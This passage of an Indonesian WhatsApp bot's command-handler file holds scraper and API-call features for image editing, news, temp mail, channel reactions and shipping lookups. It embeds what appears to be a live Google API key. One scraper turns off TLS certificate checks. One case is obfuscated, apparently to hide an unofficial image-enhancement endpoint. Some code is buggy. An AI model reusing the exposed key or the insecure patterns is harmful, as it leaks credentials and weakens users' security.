  if (!mime) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}* prompt`);
  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
  if (!text) return m.reply(`Masukkan prompt yang jelas!\n\nContoh: *${prefix + command}* ubah latar belakang menjadi pantai`);
  let promptText = text || defaultPrompt;
  
  m.reply("Sedang mengedit...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyCuQOocC6ny8Edq8rskMe2NN_lgcfaaf5g");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "/library/database/sampah/", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Sky.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Berhasil Di Edit*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Gagal gagal mengedit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}

break
    
//=======================================================
    
 /*
*{ _CASE BERITA BOLA_ }*

SUMBER ESM/CJS
https://whatsapp.com/channel/0029Vb1NWzkCRs1ifTWBb13u

SUMBER CASE
https://whatsapp.com/channel/0029VaxCZ9I9cDDdrAIznL0S

SUMBER SCAPER
https://whatsapp.com/channel/0029Vb2mOzL1Hsq0lIEHoR0N/270

📄 SOURCE CODE 👇🏻
*/

case 'beritabola': {
const axios = require('axios')
const cheerio = require('cheerio')
const https = require('https')

async function fetchBeritaBola() {
  try {
    const { data: html } = await axios.get("https://vivagoal.com/category/berita-bola/", {
      httpsAgent: new https.Agent({ rejectUnauthorized: false })
    })
    const $ = cheerio.load(html)
    const articles = []

    $(".swiper-wrapper .swiper-slide, .col-lg-6.mb-4, .col-lg-4.mb-4").each((i, el) => {  
      const url = $(el).find("a").attr("href") || null  
      const image = $(el).find("figure img").attr("src") || null  
      const title = $(el).find("h3 a").text().trim() || null  
      const categories = $(el)  
        .find("a.vg_pill_cat")  
        .map((i, cat) => $(cat).text().trim())  
        .get()  
      let date = $(el).find("time").attr("datetime") || $(el).find(".posted-on").text().trim()  
      if (!date) date = new Date().toISOString().split("T")[0]  

      if (url && title && image) {  
        articles.push({ url, image, title, categories, date })  
      }  
    })  

    return articles
  } catch (error) {
    return []
  }
}

  let articles = await fetchBeritaBola()
  if (!articles.length) return m.reply("Gagal mengambil berita bola.")

  let timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })

  let caption = `📢 Berita Bola Terbaru (Diperbarui: ${timestamp})\n\n`

  articles.slice(0, 5).forEach((article, i) => {
    caption += `${i + 1}. ${article.title}\n`
    caption += `📅 Tanggal: ${article.date}\n`
    caption += `🏷️ Kategori: ${article.categories.join(", ") || "Tidak diketahui"}\n`
    caption += `🔗 Baca Selengkapnya: ${article.url}\n\n`
  })

  await Sky.sendMessage(m.chat, {
    image: { url: articles[0].image },
    caption
  }, { quoted: m })
}
break

//=======================================================

case "bot": {
let teks = `Online bang ✅\nKetik aja .menu `
const interactiveButtons = [
     {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Menu Bot",
             id: ".menu"
        })
     }
]
const interactiveMessage = {
    text: "",
    title: teks,
    footer: `${botname2} POWERED BY ©${namaOwner}`,
    interactiveButtons
}
await Sky.sendMessage(m.chat, interactiveMessage, {quoted: m})
}
break

    
//=======================================================
    
/**[ Fitur TempMail ]*
Type: Case

*[ Sumber Case ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*[ Sumber Plugins ESM ]* https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28
*[ Sumber Scrape ]* ZErvida

*Code:*
*/
case 'tempmail': {
 class TempMail {
 constructor() {
 this.cookie = null;
 this.baseUrl = 'https://tempmail.so';
 }

 async updateCookie(response) {
 if (response.headers['set-cookie']) {
 this.cookie = response.headers['set-cookie'].join('; ');
 }
 }

 async makeRequest(url) {
const axios = require('axios');
 const response = await axios({
 method: 'GET',
 url: url,
 headers: {
 'accept': 'application/json',
 'cookie': this.cookie || '',
 'referer': this.baseUrl + '/',
 'x-inbox-lifespan': '600',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 'sec-ch-ua-mobile': '?1'
 }
 });

 await this.updateCookie(response);
 return response;
 }

 async initialize() {
const axios = require('axios');
 const response = await axios.get(this.baseUrl, {
 headers: {
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"'
 }
 });
 await this.updateCookie(response);
 return this;
 }

 async getInbox() {
 const url = `${this.baseUrl}/us/api/inbox?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }

 async getMessage(messageId) {
 const url = `${this.baseUrl}/us/api/inbox/messagehtmlbody/${messageId}?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }
 }

 try {
 const mail = new TempMail();
 await mail.initialize();

 const inbox = await mail.getInbox();

 if (!inbox.data?.name) {
 throw new Error('Failed to get temporary email');
 }

 const emailInfo = `Temporary Email\n\n*Email :* ${inbox.data.name}\n *Expired :* 10 minutes\nInbox Status : ${inbox.data.inbox?.length || 0} Pesan\n\n> Email Akan Otomatis Dihapus Setelah 10 Menit`;
 await m.reply(emailInfo);

 const state = {
 processedMessages: new Set(),
 lastCheck: Date.now(),
 isRunning: true
 };

 const processInbox = async () => {
 if (!state.isRunning) return;

 try {
 const updatedInbox = await mail.getInbox();

 if (updatedInbox.data?.inbox?.length > 0) {
 const sortedMessages = [...updatedInbox.data.inbox].sort((a, b) =>
 new Date(b.date) - new Date(a.date));

 for (const message of sortedMessages) {
 if (!state.processedMessages.has(message.id)) {
 const messageDetail = await mail.getMessage(message.id);

 let cleanContent = messageDetail.data?.html
 ? messageDetail.data.html.replace(/<[^>]*>?/gm, '').trim()
 : 'No text content';

 const messageInfo = `_Ada Pesan Baru Nih_\n\nFrom : ${message.from || 'Anomali'}\n*Subject :* ${message.subject || 'No Subject'}\n\n*Pesan :*\n${cleanContent}`;

 await Sky.sendMessage(m.chat, { text: messageInfo }, { quoted: m });
 state.processedMessages.add(message.id);
 }
 }
 }
 } catch (error) {
 console.error('Error:', error);
 }
 };

 await processInbox();

 const checkInterval = setInterval(processInbox, 10000);

 setTimeout(() => {
 state.isRunning = false;
 clearInterval(checkInterval);
 m.reply('Email Otomatis Di Hapus Setelah 10 Menit');
 }, 600000);

 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
}
 break
    
//=======================================================
    
case "reactcht": {
 if (!text || !args[0] || !args[1]) 
 return m.reply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 🗿‚")
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return m.reply("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await Sky.newsletterMetadata("invite", result) 
 let [AaN, ...message] = text.split(' ');
message = message.join(' ');
 let AlphabetandNumbers;
 switch(AaN) {
case 'a':
case 'A':
  AlphabetandNumbers = '🅰';
  break;
case 'b':
case 'B':
  AlphabetandNumbers = '🅱';
  break;
case 'c':
case 'C':
  AlphabetandNumbers = '🅲';
  break;
case 'd':
case 'D':
  AlphabetandNumbers = '🅳';
  break;
case 'e':
case 'E':
  AlphabetandNumbers = '🅴';
  break;
case 'f':
case 'F':
  AlphabetandNumbers = '🅵';
  break;
case 'g':
case 'G':
  AlphabetandNumbers = '🅶';
  break;
case 'h':
case 'H':
  AlphabetandNumbers = '🅷';
  break;
case 'i':
case 'I':
  AlphabetandNumbers = '🅸';
  break;
case 'j':
case 'J':
  AlphabetandNumbers = '🅹';
  break;
case 'k':
case 'K':
  AlphabetandNumbers = '🅺';
  break;
case 'l':
case 'L':
  AlphabetandNumbers = '🅻';
  break;
case 'm':
case 'M':
  AlphabetandNumbers = '🅼';
  break;
case 'n':
case 'N':
  AlphabetandNumbers = '🅽';
  break;
case 'o':
case 'O':
  AlphabetandNumbers = '🅾';
  break;
case 'p':
case 'P':
  AlphabetandNumbers = '🅿';
  break;
case 'q':
case 'Q':
  AlphabetandNumbers = '🆀';
  break;
case 'r':
case 'R':
  AlphabetandNumbers = '🆁';
  break;
case 's':
case 'S':
  AlphabetandNumbers = '🆂';
  break;
case 't':
case 'T':
  AlphabetandNumbers = '🆃';
  break;
case 'u':
case 'U':
  AlphabetandNumbers = '🆄';
  break;
case 'v':
case 'V':
  AlphabetandNumbers = '🆅';
  break;
case 'w':
case 'W':
  AlphabetandNumbers = '??';
  break;
case 'x':
case 'X':
  AlphabetandNumbers = '🆇';
  break;
case 'y':
case 'Y':
  AlphabetandNumbers = '🆈';
  break;
case 'z':
case 'Z':
  AlphabetandNumbers = '🆉';
  break;
case '1':
  AlphabetandNumbers = '➊';
  break;
case '2':
  AlphabetandNumbers = '➋';
  break;
case '3':
  AlphabetandNumbers = '➌';
  break;
case '4':
  AlphabetandNumbers = '➍';
  break;
case '5':
  AlphabetandNumbers = '➎';
  break;
case '6':
  AlphabetandNumbers = '➏';
  break;
case '7':
  AlphabetandNumbers = '➐';
  break;
case '8':
  AlphabetandNumbers = '➑';
  break;
case '9':
  AlphabetandNumbers = '➒';
  break;
case '0':
  AlphabetandNumbers = '⓿';
  break;
  default:
   return m.reply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 🗿‚")
}
 if (!args[1].includes(AlphabetandNumbers))
 return await Sky.newsletterReactMessage(res.id, serverId, AlphabetandNumbers)
 await Sky.newsletterReactMessage(res.id, serverId, args[1])
 m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break

    
//=========================================================
/*    
*{ _CASE HDR_ }*
SUMBER CASE
https://whatsapp.com/channel/0029VaxCZ9I9cDDdrAIznL0S

YANG REQUEST
6288807709243

kalo error pm nomor deks

*/
case "hd2":
case "tohd2": {
    if (!/image/.test(mime)) return m.reply("Silakan kirim atau balas foto.");
    
    await Sky.sendMessage(m.chat, {react:  {text: '📥', key: m.key}});
    
     const yamille = joaniel;
    (function (ryann, ea) {
     const samyra = joaniel, marnia = ryann();
     while (true) {
      try {
         const mckynzee = parseInt(samyra(137)) / 1 * (-parseInt(samyra(133)) / 2) + -parseInt(samyra(134)) / 3 + parseInt(samyra(155)) / 4 * (parseInt(samyra(156)) / 5) + -parseInt(samyra(131)) / 6 * (-parseInt(samyra(130)) / 7) + -parseInt(samyra(140)) / 8 * (parseInt(samyra(147)) / 9) + parseInt(samyra(145)) / 10 + parseInt(samyra(138)) / 11;
          if (mckynzee === ea) break; else marnia.push(marnia.shift());
     } catch (beril) {
       marnia.push(marnia.shift());
      }
      }
    }(altavious, 888830));
    const FormData = require("form-data"), Jimp = require(yamille(154));
    function joaniel(wendolyne, nyier) {
    const enalina = altavious();
    return joaniel = function (laurae, mekelle) {
     laurae = laurae - 127;
        let ralphine = enalina[laurae];
        return ralphine;
    }, joaniel(wendolyne, nyier);
    }
    function altavious() {
    const jaylenn = ["inferenceengine", "push", "21AoSGqU", "225006xOkcNu", "concat", "472390FPofBK", "4809828vvqtte", "data", "model_version", "3NUOcvQ", "14047187eKUyBb", "error", "3013792ZhnCJd", "okhttp/4.9.3", ".ai/", "enhance_image_body.jpg", "from", "10610670esKiBu", "append", "18nRsxLl", "submit", "https", "image", ".vyro", "image/jpeg", "enhance", "jimp", "24448HhNNWt", "1230ttmiGH", "Keep-Alive"];
    altavious = function () {
        return jaylenn;
     };
    return altavious();
    }
    
    async function remini(kyoko, tysa) {
  return new Promise(async (majeed, tamicko) => {
    const deamber = joaniel;
    let milahn = [deamber(153), "recolor", "dehaze"];
    milahn.includes(tysa) ? tysa = tysa : tysa = milahn[0];
    let kymire, nazar = new FormData, lennel = deamber(149) + "://" + deamber(128) + deamber(151) + deamber(142) + tysa;
    nazar[deamber(146)](deamber(136), 1, {"Content-Transfer-Encoding": "binary", contentType: "multipart/form-data; charset=uttf-8"}), nazar[deamber(146)](deamber(150), Buffer[deamber(144)](kyoko), {filename: deamber(143), contentType: deamber(152)}), nazar[deamber(148)]({url: lennel, host: deamber(128) + deamber(151) + ".ai", path: "/" + tysa, protocol: "https:", headers: {"User-Agent": deamber(141), Connection: deamber(127), "Accept-Encoding": "gzip"}}, function (suha, deantoine) {
      const lakeysia = deamber;
      if (suha) tamicko();
      let zyan = [];
      deantoine.on(lakeysia(135), function (spicie, ebunoluwa) {
        const bellaluna = lakeysia;
        zyan[bellaluna(129)](spicie);
      }).on("end", () => {
        const camden = lakeysia;
        majeed(Buffer[camden(132)](zyan));
      }), deantoine.on(lakeysia(139), shady => {
        tamicko();
      });
    });
  });
}

    try {
        await Sky.sendMessage(m.chat, {react:  {text: '🔃', key: m.key}});
        
        // Mengunduh media dari pesan yang dikutip
        let media = await quoted.download();
        let imageBuffer = media; // Menggunakan media yang diunduh sebagai buffer gambar
        let result = await remini(imageBuffer, "enhance");
        
        await Sky.sendMessage(m.chat, {react:  {text: '📤', key: m.key}});
        
        // Mengirimkan gambar hasil ke pengguna
        await Sky.sendMessage(m.chat, { image: result, caption: 'Gambar telah diubah menjadi HD✅'}, { quoted: m });
        await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}});
    } catch (error) {
        console.error("Error:", error);
        await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}});
        m.reply("Terjadi kesalahan saat memproses gambar.");
    }
}
break;
//=======================================================
    
/*[ Fitur Style Text ]*
Buat teks dengan gaya font yang beragam 😏
Type: Case
*[ Sumber ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v

*Code:*
*/
case 'styletext': case 'ctext': case 'createtext': case 'teks': {
  if (!q) return m.reply(`Masukin teksnya dulu!\nContoh: ${prefix + command} Halo Saya Biyu`);
  const axios = require('axios');
  const cheerio = require('cheerio');

  try {
    let res = await axios.get(`https://qaz.wtf/u/convert.cgi?text=${encodeURIComponent(q)}`);
    let $ = cheerio.load(res.data);
    let hasil = [];
    $('table > tbody > tr').each((i, el) => {
      let style = $(el).find('td').eq(0).text().trim();
      let text = $(el).find('td').eq(1).text().trim();
      if (style && text) {
        hasil.push(`*${style}:*\n${text}`);
      }
    });
    if (hasil.length === 0) return m.reply('Gagal mengambil style, coba lagi nanti.');
    let teks = `*Hasil StyleText dari:* ${q}\n\n` + hasil.join('\n\n');
    m.reply(teks);
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat mengambil data.');
  }
}
  break
//=======================================================
    
case 'colorrize': {
    if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"));
    await Sky.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

    try {
        const qmsg = m.quoted ? m.quoted : m; // Definisikan qmsg
        if (!qmsg) return m.reply("Balas atau kirim gambar!");

        const savefoto = await Sky.downloadAndSaveMediaMessage(qmsg);
        if (!savefoto) return m.reply("Gagal mengunduh foto.");

        const { ImageUploadService } = require('node-upload-images');
        const service = new ImageUploadService('pixhost.to');
        const uploadResult = await service.uploadFromBinary(fs.readFileSync(savefoto), 'Rafzbot.png');

        if (!uploadResult || !uploadResult.directLink) {
            fs.unlinkSync(savefoto); // Hapus file yang disimpan jika gagal unggah
            return m.reply("Gagal mengunggah foto ke Pixhost.");
        }

        const directLink = uploadResult.directLink.toString();
        const color = `https://api.siputzx.my.id/api/tools/colorize?url=${directLink}`;
        const done = `https://api.siputzx.my.id/api/tools/dewatermark?url=${color}`;

        await Sky.sendMessage(m.chat, { image: { url: done } });
        await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        fs.unlinkSync(savefoto); // Hapus file yang disimpan setelah berhasil
    } catch (error) {
        console.error("Error saat memproses colorize:", error);
        await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        m.reply("Gagal memproses gambar.");
        // Tambahkan logika untuk menghapus file yang mungkin tersimpan jika terjadi error
        if (savefoto && fs.existsSync(savefoto)) {
            fs.unlinkSync(savefoto);
        }
    }
} 
break;
//=======================================================

case 'presetam':
case 'alightmotion': {
const axios = require('axios');
const cheerio = require('cheerio');
const ya = `Contoh Penggunaan : .presetam https://alightcreative.com/am/share/u/FttFe29F5Dd3AUOxUIiztaBmABw2/p/sd8WMnsElo-b71f57e092dbe21f?source=link`;

  if (!text) return m.reply(ya);
  if (!/^(http:\/\/|https:\/\/)/i.test(text)) return m.reply(`URL tidak valid, mohon masukkan URL yang benar. Coba tambahkan http:// atau https://`);
  if (!/(alight\.link|alightcreative\.com)/i.test(text)) return m.reply(`URL Alight Motion tidak valid.`);

  m.reply('[ *PRESET ALIGHT MOTION* ]\n\nSedang mengambil informasi preset...');

  try {
    const response = await axios.get(text, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://alight.link',
      },
    });

    const $ = cheerio.load(response.data);
    const title = $('meta[property="og:title"]').attr('content');
    const description = $('meta[property="og:description"]').attr('content');

    m.reply(`[ *PRESET ALIGHT MOTION* ]

Judul: ${title || 'Tidak ditemukan'}
Deskripsi: ${description || 'Tidak ditemukan'}
`);

  } catch (error) {
    console.error(error);
    m.reply(`Gagal mengambil informasi preset. Pastikan URL benar dan coba lagi.`);
  }
} 
break;

//=======================================================
    
/*
📌 Nama Fitur: Meme Random 
🏷️ Type : Plugin ESM
🔗 Sumber : https://whatsapp.com/channel/0029Vb91Rbi2phHGLOfyPd3N
✍️ Convert By ZenzXD
*/
case 'meme': {
const axios = require('axios')

  try {
    const { data: json } = await axios.get('https://api.vreden.my.id/api/meme')

    if (!json.status || !json.result) throw '❌ Gagal mengambil meme.'

    await Sky.sendMessage(m.chat, {
      image: { url: json.result },
      caption: ' *Meme Random Kadang Absurd*😐😹'
    }, { quoted: m })

  } catch (e) {
    console.error(e)
    m.reply('❌ Terjadi kesalahan saat mengambil meme.')
  }
}
break
//=======================================================
    /*
`GSMARENA`
Weem :
https://whatsapp.com/channel/0029Vb9ZfML6GcGFm9aPgh0W
*/
case 'gsmarena' : {
let fetch = require('node-fetch');

  if (!text) m.reply(`*🚩 Contoh:* ${prefix + command} iPhone 12`);
  let teks = '';
  
  try {
    const api = await fetch(`https://fastrestapis.fasturl.cloud/search/gsmarena/advanced?query=${encodeURIComponent(text)}`);
    let json = await api.json();
    
    if (json.status !== 200) m.reply(`🚩 *Gagal Memuat Data!*`);

    let result = json.result;
    let specs = result.specs;

    teks += `*${result.name}*\n\n`;
    teks += `📅 *Rilis:* ${result.releaseDate}\n`;
    teks += `⚖ *Berat:* ${result.weight}\n`;
    teks += `📱 *OS:* ${result.os}\n`;
    teks += `💾 *Storage:* ${result.storage}\n`;
    teks += `🖥 *Layar:* ${result.displaySize} - ${result.displayResolution}\n`;
    teks += `📷 *Kamera:* ${result.camera} MP (Video: ${result.video})\n`;
    teks += `🎮 *Chipset:* ${result.chipset}\n`;
    teks += `⚡ *Baterai:* ${result.battery} mAh (Charging: ${result.charging})\n\n`;

    teks += '*📡 Network*\n';
    teks += `- Technology: ${specs.Network.Technology}\n`;
    teks += `- 2G Bands: ${specs.Network["2G bands"]}\n`;
    teks += `- 3G Bands: ${specs.Network["3G bands"]}\n`;
    teks += `- 4G Bands: ${specs.Network["4G bands"]}\n`;
    teks += `- 5G Bands: ${specs.Network["5G bands"]}\n`;
    teks += `- Speed: ${specs.Network.Speed}\n\n`;

    teks += '*📦 Body*\n';
    teks += `- Dimensions: ${specs.Body.Dimensions}\n`;
    teks += `- Weight: ${specs.Body.Weight}\n`;
    teks += `- Build: ${specs.Body.Build}\n`;
    teks += `- SIM: ${specs.Body.SIM}\n\n`;

    teks += '*🔧 Platform*\n';
    teks += `- OS: ${specs.Platform.OS}\n`;
    teks += `- Chipset: ${specs.Platform.Chipset}\n`;
    teks += `- CPU: ${specs.Platform.CPU}\n`;
    teks += `- GPU: ${specs.Platform.GPU}\n\n`;

    teks += '*🔋 Battery*\n';
    teks += `- Type: ${specs.Battery.Type}\n`;
    teks += `- Charging: ${specs.Battery.Charging}\n\n`;

    teks += '*🎨 Warna*\n';
    teks += `${specs.Misc.Colors}\n\n`;

    teks += `🌐 *Sumber:* [GSM Arena](${json.result.url})\n\n`;
    teks += `🖼 *Preview:* ${json.result.imageUrl}\n`;

    await Sky.relayMessage(m.chat, {
      extendedTextMessage: {
        text: teks,
        contextInfo: {
          externalAdReply: {
            title: 'DEVICE INFORMATION',
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: true,
            thumbnailUrl: json.result.imageUrl,
            sourceUrl: json.result.url
          }
        },
        mentions: [m.sender]
      }
    }, {});
  } catch (e) {
    console.error(e);
    m.reply(`🚩 *Gagal Memuat Data!*`);
  }
};

break
//=======================================================
    
/*
📌 Nama Fitur: Lahelu Fix🗿
🏷️ Type : Plugin ESM
🔗 Sumber : https://whatsapp.com/channel/0029Vb91Rbi2phHGLOfyPd3N

Kalau Gaada Video/foto cuman muncul teks itu lu ketik lagi ya

✍️ Convert By ZenzXD
*/
case 'lahelu' : {
const fetch = require('node-fetch')

const lastResultMap = new Map()

  if (!text) return m.reply(`⚠️ Contoh penggunaan:\n.lahelu tiktok`)

  try {
    let res = await fetch(`https://api.siputzx.my.id/api/s/lahelu?query=${encodeURIComponent(text)}`)
    if (!res.ok) return m.reply(`❌ Gagal mengambil data dari API.`)

    let json = await res.json()
    if (!json.status || !json.data || !json.data.length) {
      return m.reply(`❌ Tidak ditemukan hasil untuk: *${text}*`)
    }

    // Pilih random yang beda dari sebelumnya
    let data
    let tries = 0
    const maxTries = 5
    do {
      const i = Math.floor(Math.random() * json.data.length)
      data = json.data[i]
      tries++
    } while (lastResultMap.get(m.sender) === data.postId && tries < maxTries)
    lastResultMap.set(m.sender, data.postId)

    // Ambil media: video dulu, lalu gambar
    const media = data?.content?.find(x => x.type === 1 || x.type === 4)?.value
    const image = data?.content?.find(x => x.type === 2)?.value
    const mediaUrl = media || image

    const caption = `📦 *Hasil Pencarian Lahelu*\n\n` +
                    `🔍 *Query:* ${text}\n` +
                    `🎞️ *Judul:* ${data.title || '-'}\n` +
                    `👤 *User:* ${data.userInfo?.username || '-'}\n` +
                    `🌐 *Profil:* https://lahelu.com/user/${data.userInfo?.username || ''}\n` +
                    `📝 *Post:* https://lahelu.com/post/${data.postId}`

    if (!mediaUrl) return m.reply(caption + `\n⚠️ Tidak ada media yang bisa ditampilkan.`)

    if (mediaUrl.endsWith('.mp4')) {
      await Sky.sendMessage(m.chat, { video: { url: mediaUrl }, caption }, { quoted: m })
    } else {
      await Sky.sendMessage(m.chat, { image: { url: mediaUrl }, caption }, { quoted: m })
    }
  } catch (e) {
    console.error(e)
    m.reply(`❌ Terjadi kesalahan:\n${e.message}`)
  }
}
break
//=======================================================


case 'recollor': {
    if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"));
    await Sky.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

    try {
        const qmsg = m.quoted ? m.quoted : m; // Definisikan qmsg
        if (!qmsg) return m.reply("Balas atau kirim gambar!");

        const savefoto = await Sky.downloadAndSaveMediaMessage(qmsg);
        if (!savefoto) return m.reply("Gagal mengunduh foto.");

        const { ImageUploadService } = require('node-upload-images');
        const service = new ImageUploadService('postimages.org');
        const uploadResult = await service.uploadFromBinary(fs.readFileSync(savefoto), 'Rafzbot.png');

        if (!uploadResult || !uploadResult.directLink) {
            fs.unlinkSync(savefoto); // Hapus file yang disimpan jika gagal unggah
            return m.reply("Gagal mengunggah foto ke Pixhost.");
        }

        const directLink = uploadResult.directLink.toString();
        const done = `https://fastrestapis.fasturl.cloud/aiimage/imgrecolor?url=${directLink}`;

        await Sky.sendMessage(m.chat, { image: { url: done } });
        await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        fs.unlinkSync(savefoto); // Hapus file yang disimpan setelah berhasil
    } catch (error) {
        console.error("Error saat memproses recollor:", error);
        await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        m.reply("Gagal memproses gambar.");
        // Tambahkan logika untuk menghapus file yang mungkin tersimpan jika terjadi error
        if (savefoto && fs.existsSync(savefoto)) {
            fs.unlinkSync(savefoto);
        }
    }
}
break;

//=======================================================
    
/*
*[ Fitur CekResi & CekOngkir ]*

*[ Sumber Case ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*[ Sumber Plugins ]* https://whatsapp.com/channel/0029Vb9ZfML6GcGFm9aPgh0W

*Code:*
*/

case "cekongkir":
 if (args.length < 6) {
 return m.reply("📌 *Contoh penggunaan:*\n!cekongkir <asal> <tujuan> <berat (gram)> <kurir> <tinggi (cm)> <panjang (cm)> <lebar (cm)>\n\n" +
 "Contoh:\n!cekongkir Jakarta Lampung 1000 jnt 10 20 15\n\n" +
 "📌 *Kurir yang tersedia:*\nJNE, JNT, SiCepat, AnterAja, Wahana, RPX, IDExpress, JDL, Lion, TIKI, Ninja, SAP, POS");
 }

 let origin = args[0];
 let destination = args[1];
 let weight = args[2];
 let courierOngkir = args[3].toLowerCase();
 let height = args[4];
 let length = args[5];
 let width = args[6];

 let validCouriersOngkir = ["jne", "jnt", "sicepat", "anteraja", "wahana", "rpx", "idexpress", "jdl", "lion", "tiki", "ninja", "sap", "pos"];

 if (!validCouriersOngkir.includes(courierOngkir)) {
 return m.reply("❌ *Kurir tidak valid!*\nGunakan salah satu dari: JNE, JNT, SiCepat, AnterAja, Wahana, RPX, IDExpress, JDL, Lion, TIKI, Ninja, SAP, POS.");
 }

 let apiUrlOngkir = `https://fastrestapis.fasturl.cloud/search/shippingrates?origin=${encodeURIComponent(origin)}&destination=${encodeURIComponent(destination)}&weight=${encodeURIComponent(weight)}&courier=${encodeURIComponent(courierOngkir)}&height=${encodeURIComponent(height)}&length=${encodeURIComponent(length)}&width=${encodeURIComponent(width)}`;

 try {
 let response = await fetch(apiUrlOngkir);
 let result = await response.json();

 if (result.status !== 200 || !result.result.success) {
 return m.reply("❌ *Gagal mendapatkan ongkos kirim. Coba lagi nanti.*");
 }

 let pricing = result.result.pricing[0];
 let messageOngkir = `
✅ *Cek Ongkir Berhasil!*
📍 *Asal:* ${origin}
🎯 *Tujuan:* ${destination}
⚖️ *Berat:* ${weight} gram
📦 *Dimensi:* ${height}x${length}x${width} cm
🚛 *Kurir:* ${pricing.courierName} (${pricing.courierCode.toUpperCase()})
📦 *Layanan:* ${pricing.courierServiceName} - ${pricing.description}
💰 *Harga:* Rp${pricing.price.toLocaleString("id-ID")}
⏳ *Estimasi:* ${pricing.duration}
 `.trim();

 m.reply(messageOngkir);
 } catch (err) {
 console.error("❌ Error:", err);
 m.reply("❌ *Terjadi kesalahan saat mengambil data ongkos kirim. Coba lagi nanti.*");
 }
 break

case "cekresi":
 if (args.length < 2) {
 return m.reply("📌 *Contoh penggunaan:*\n!cekresi <nomor resi> <kurir>\n\n" +
 "Contoh:\n!cekresi 1234567890 jne\n\n" +
 "📌 *Kurir yang tersedia:*\njne, jnt, sicepat, anteraja, wahana, rpx, idexpres, jdl, lion, tiki, ninja, sap, pos");
 }

 let trackingNumber = args[0];
 let courier = args[1]
 let validCouriers = ["jne", "jnt", "sicepat", "anteraja", "wahana", "rpx", "idexpress", "jdl", "lion", "tiki", "ninja", "sap", "pos"];

 if (!validCouriers.includes(courier)) {
 return m.reply("❌ *Kurir tidak valid!*\nGunakan salah satu dari: JNE, JNT, SiCepat, AnterAja, Wahana, RPX, IDExpress, JDL, Lion, TIKI, Ninja, SAP, POS.");
 }

 let apiUrlResi = `https://fastrestapis.fasturl.cloud/search/trackingshipment?trackingNumber=${encodeURIComponent(trackingNumber)}&courier=(courier)`;

 try {
 let response = await fetch(apiUrlResi);
 let result = await response.json();

 if (result.status !== 200 || !result.result.success) {
 return m.reply("❌ *Gagal melacak resi. Pastikan nomor resi dan kurir sudah benar.*");
 }

 let trackingInfo = result.result;
 let history = trackingInfo.history.map((h) => `📅 *${h.date}*\n📍 ${h.location}\n🔹 ${h.description}`).join("\n\n");

 // Cek apakah trackingInfo.courier dan code tersedia
 let courierName = trackingInfo.courier?.name || "Tidak diketahui";
 let courierCode = trackingInfo.courier?.code ? trackingInfo.courier.code.toUpperCase() : "-";

 let message = `
✅ *Cek Resi Berhasil!*
🚛 *Kurir:* ${courierName} (${courierCode})
📦 *Nomor Resi:* ${trackingInfo.waybill}
📍 *Asal:* ${trackingInfo.origin}
🎯 *Tujuan:* ${trackingInfo.destination}
⚖️ *Berat:* ${trackingInfo.weight} kg
⏳ *Estimasi Tiba:* ${trackingInfo.estimatedDelivery}
📢 *Status Pengiriman:* ${trackingInfo.deliveryStatus.replace("_", " ").toUpperCase()}

📜 *Riwayat Pengiriman:*
${history}
 `.trim();

 m.reply(message);
 } catch (err) {
 console.error("❌ Error:", err);
 m.reply("❌ *Terjadi kesalahan saat melacak resi. Coba lagi nanti.*");
 }
 break

//=======================================================
    
